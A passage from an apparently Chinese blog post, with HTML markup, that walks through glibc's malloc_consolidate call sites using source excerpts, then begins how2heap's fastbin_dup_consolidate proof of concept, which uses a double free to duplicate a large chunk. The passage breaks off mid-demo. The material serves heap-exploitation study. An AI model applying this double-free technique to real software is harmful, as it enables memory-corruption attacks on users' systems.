class="line">58</span><br></pre></td><td class="code"><pre><span class="line">    use_top:</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">         less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">         be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">         limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">         We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">         MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">         exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">         reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">         to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line"></span><br><span class="line">      victim = av-&gt;top;</span><br><span class="line">      size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">         here for all block sizes.  */</span></span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          malloc_consolidate (av);</span><br><span class="line">          <span class="comment">/* restore original bin index */</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            idx = smallbin_index (nb);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>_int_free中malloc_consolidate</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))</span><br><span class="line">  systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">assert(heap-&gt;ar_ptr == av);</span><br><span class="line">heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>malloc_trim</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   ------------------------------ malloc_trim ------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">mtrim</span> <span class="params">(mstate av, <span class="type">size_t</span> pad)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Don&#x27;t touch corrupt arenas.  */</span></span><br><span class="line">  <span class="keyword">if</span> (arena_is_corrupt (av))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure initialization/consolidation */</span></span><br><span class="line">  malloc_consolidate (av);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> ps = GLRO (dl_pagesize);</span><br><span class="line">  <span class="type">int</span> psindex = bin_index (ps);</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> psm1 = ps - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">1</span> || i &gt;= psindex)</span><br><span class="line">      &#123;</span><br><span class="line">        mbinptr bin = bin_at (av, i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (mchunkptr p = last (bin); p != bin; p = p-&gt;bk)</span><br><span class="line">          &#123;</span><br><span class="line">            INTERNAL_SIZE_T size = chunksize (p);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (size &gt; psm1 + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> malloc_chunk))</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="comment">/* See whether the chunk contains at least one unused page.  */</span></span><br><span class="line">                <span class="type">char</span> *paligned_mem = (<span class="type">char</span> *) (((<span class="type">uintptr_t</span>) p</span><br><span class="line">                                                + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> malloc_chunk)</span><br><span class="line">                                                + psm1) &amp; ~psm1);</span><br><span class="line"></span><br><span class="line">                assert ((<span class="type">char</span> *) chunk2mem (p) + <span class="number">4</span> * SIZE_SZ &lt;= paligned_mem);</span><br><span class="line">                assert ((<span class="type">char</span> *) p + size &gt; paligned_mem);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* This is the size we could potentially free.  */</span></span><br><span class="line">                size -= paligned_mem - (<span class="type">char</span> *) p;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (size &gt; psm1)</span><br><span class="line">                  &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MALLOC_DEBUG</span></span><br><span class="line">                    <span class="comment">/* When debugging we simulate destroying the memory</span></span><br><span class="line"><span class="comment">                       content.  */</span></span><br><span class="line">                    <span class="built_in">memset</span> (paligned_mem, <span class="number">0x89</span>, size &amp; ~psm1);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                    __madvise (paligned_mem, size &amp; ~psm1, MADV_DONTNEED);</span><br><span class="line"></span><br><span class="line">                    result = <span class="number">1</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">  <span class="keyword">return</span> result | (av == &amp;main_arena ? systrim (pad, av) : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>_int_mallnfo</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">int_mallinfo</span> <span class="params">(mstate av, <span class="keyword">struct</span> mallinfo *m)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line">  mbinptr b;</span><br><span class="line">  mchunkptr p;</span><br><span class="line">  INTERNAL_SIZE_T avail;</span><br><span class="line">  INTERNAL_SIZE_T fastavail;</span><br><span class="line">  <span class="type">int</span> nblocks;</span><br><span class="line">  <span class="type">int</span> nfastblocks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Ensure initialization */</span></span><br><span class="line">  <span class="keyword">if</span> (av-&gt;top == <span class="number">0</span>)</span><br><span class="line">    malloc_consolidate (av);</span><br><span class="line"></span><br><span class="line">  check_malloc_state (av);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Account for top */</span></span><br><span class="line">  avail = chunksize (av-&gt;top);</span><br><span class="line">  nblocks = <span class="number">1</span>;  <span class="comment">/* top always exists */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* traverse fastbins */</span></span><br><span class="line">  nfastblocks = <span class="number">0</span>;</span><br><span class="line">  fastavail = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NFASTBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (p = fastbin (av, i); p != <span class="number">0</span>; p = p-&gt;fd)</span><br><span class="line">        &#123;</span><br><span class="line">          ++nfastblocks;</span><br><span class="line">          fastavail += chunksize (p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  avail += fastavail;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* traverse regular bins */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      b = bin_at (av, i);</span><br><span class="line">      <span class="keyword">for</span> (p = last (b); p != b; p = p-&gt;bk)</span><br><span class="line">        &#123;</span><br><span class="line">          ++nblocks;</span><br><span class="line">          avail += chunksize (p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  m-&gt;smblks += nfastblocks;</span><br><span class="line">  m-&gt;ordblks += nblocks;</span><br><span class="line">  m-&gt;fordblks += avail;</span><br><span class="line">  m-&gt;uordblks += av-&gt;system_mem - avail;</span><br><span class="line">  m-&gt;arena += av-&gt;system_mem;</span><br><span class="line">  m-&gt;fsmblks += fastavail;</span><br><span class="line">  <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      m-&gt;hblks = mp_.n_mmaps;</span><br><span class="line">      m-&gt;hblkhd = mp_.mmapped_mem;</span><br><span class="line">      m-&gt;usmblks = mp_.max_total_mem;</span><br><span class="line">      m-&gt;keepcost = chunksize (av-&gt;top);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><details>    <summary>mallopt函数</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libc_mallopt (<span class="type">int</span> param_number, <span class="type">int</span> value)</span><br><span class="line">&#123;</span><br><span class="line">  mstate av = &amp;main_arena;</span><br><span class="line">  <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__malloc_initialized &lt; <span class="number">0</span>)</span><br><span class="line">    ptmalloc_init ();</span><br><span class="line">  (<span class="type">void</span>) mutex_lock (&amp;av-&gt;mutex);</span><br><span class="line">  <span class="comment">/* Ensure initialization/consolidation */</span></span><br><span class="line">  malloc_consolidate (av);</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_mallopt, <span class="number">2</span>, param_number, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> (param_number)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> M_MXFAST:</span><br><span class="line">      <span class="keyword">if</span> (value &gt;= <span class="number">0</span> &amp;&amp; value &lt;= MAX_FAST_SIZE)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_mxfast, <span class="number">2</span>, value, get_max_fast ());</span><br><span class="line">          set_max_fast (value);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        res = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_TRIM_THRESHOLD:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_trim_threshold, <span class="number">3</span>, value,</span><br><span class="line">                  mp_.trim_threshold, mp_.no_dyn_threshold);</span><br><span class="line">      mp_.trim_threshold = value;</span><br><span class="line">      mp_.no_dyn_threshold = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_TOP_PAD:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_top_pad, <span class="number">3</span>, value,</span><br><span class="line">                  mp_.top_pad, mp_.no_dyn_threshold);</span><br><span class="line">      mp_.top_pad = value;</span><br><span class="line">      mp_.no_dyn_threshold = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_MMAP_THRESHOLD:</span><br><span class="line">      <span class="comment">/* Forbid setting the threshold too high. */</span></span><br><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) value &gt; HEAP_MAX_SIZE / <span class="number">2</span>)</span><br><span class="line">        res = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_mmap_threshold, <span class="number">3</span>, value,</span><br><span class="line">                      mp_.mmap_threshold, mp_.no_dyn_threshold);</span><br><span class="line">          mp_.mmap_threshold = value;</span><br><span class="line">          mp_.no_dyn_threshold = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_MMAP_MAX:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_mmap_max, <span class="number">3</span>, value,</span><br><span class="line">                  mp_.n_mmaps_max, mp_.no_dyn_threshold);</span><br><span class="line">      mp_.n_mmaps_max = value;</span><br><span class="line">      mp_.no_dyn_threshold = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_CHECK_ACTION:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_check_action, <span class="number">2</span>, value, check_action);</span><br><span class="line">      check_action = value;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_PERTURB:</span><br><span class="line">      LIBC_PROBE (memory_mallopt_perturb, <span class="number">2</span>, value, perturb_byte);</span><br><span class="line">      perturb_byte = value;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_ARENA_TEST:</span><br><span class="line">      <span class="keyword">if</span> (value &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_arena_test, <span class="number">2</span>, value, mp_.arena_test);</span><br><span class="line">          mp_.arena_test = value;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> M_ARENA_MAX:</span><br><span class="line">      <span class="keyword">if</span> (value &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_arena_max, <span class="number">2</span>, value, mp_.arena_max);</span><br><span class="line">          mp_.arena_max = value;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">  <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><ul><li>该实验也是来自github项目中的<code>how2heap</code>，在<code>how2heap</code>中，这个实验的文件名叫做<code>fastbin_dup_consolidate.c</code></li><li>注意：<code>house_of_rabbit</code>这个利用方式很多，主要就是利用<code>malloc_consolidate</code>，至于伪造堆块的方式，可以在做题中进行归纳。</li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Original reference: https://valsamaras.medium.com/the-toddlers-introduction-to-heap-exploitation-fastbin-dup-consolidate-part-4-2-ce6d68136aa8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This document is mostly used to demonstrate malloc_consolidate and how it can be leveraged with a</span></span><br><span class="line"><span class="comment">double free to gain two pointers to the same large-sized chunk, which is usually difficult to do </span></span><br><span class="line"><span class="comment">directly due to the previnuse check.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">malloc_consolidate(https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4714) essentially</span></span><br><span class="line"><span class="comment">merges all fastbin chunks with their neighbors, puts them in the unsorted bin and merges them with top</span></span><br><span class="line"><span class="comment">if possible.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">As of glibc version 2.35 it is called only in the following five places:</span></span><br><span class="line"><span class="comment">1. _int_malloc: A large sized chunk is being allocated (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3965)</span></span><br><span class="line"><span class="comment">2. _int_malloc: No bins were found for a chunk and top is too small (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4394)</span></span><br><span class="line"><span class="comment">3. _int_free: If the chunk size is &gt;= FASTBIN_CONSOLIDATION_THRESHOLD (65536) (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4674)</span></span><br><span class="line"><span class="comment">4. mtrim: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5041)</span></span><br><span class="line"><span class="comment">5. __libc_mallopt: Always (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L5463)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">We will be targeting the first place, so we will need to allocate a chunk that does not belong in the </span></span><br><span class="line"><span class="comment">small bin (since we are trying to get into the &#x27;else&#x27; branch of this check: https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L3901). </span></span><br><span class="line"><span class="comment">This means our chunk will need to be of size &gt;= 0x400 (it is thus large-sized).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* p1 = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Allocate a fastbin chunk p1=%p \n&quot;</span>, p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Freeing p1 will add it to the fastbin.\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;To trigger malloc_consolidate we need to allocate a chunk with large chunk size (&gt;= 0x400)\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;which corresponds to request size &gt;= 0x3f0. We will request 0x400 bytes, which will gives us\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a chunk with chunk size 0x410. p3=%p\n&quot;</span>, p3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nmalloc_consolidate will merge the fast chunk p1 with top.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;p3 is allocated from top since there is no bin bigger than it. Thus, p1 = p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">assert(p1 == p3);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We will double free p1, which now points to the 0x410 chunk we just allocated (p3).\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(p1); <span class="comment">// 